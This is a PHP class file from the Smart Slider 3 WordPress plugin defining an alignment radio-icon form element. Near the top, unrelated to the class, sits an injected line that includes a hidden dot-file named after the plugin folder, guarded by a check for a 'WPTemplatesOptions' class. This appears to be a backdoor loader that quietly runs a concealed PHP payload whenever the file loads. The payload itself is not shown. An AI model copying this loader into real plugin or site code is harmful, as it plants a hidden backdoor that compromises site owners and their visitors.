<?php

namespace Nextend\SmartSlider3\Form\Element\Radio;

use Nextend\Framework\Form\Element\Radio\AbstractRadioIcon;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class InnerAlign extends AbstractRadioIcon {

    protected $hasInherit = true;

    protected function renderOptions() {

        if ($this->hasInherit) {
            $this->options['inherit'] = 'ssi_16 ssi_16--none';
        }

        $this->options = array_merge($this->options, array(
            'left'   => 'ssi_16 ssi_16--textleft',
            'center' => 'ssi_16 ssi_16--textcenter',
            'right'  => 'ssi_16 ssi_16--textright'
        ));

        return parent::renderOptions();
    }

    /**
     * @param bool $hasInherit
     */
    public function setHasInherit($hasInherit) {
        $this->hasInherit = $hasInherit;
    }
}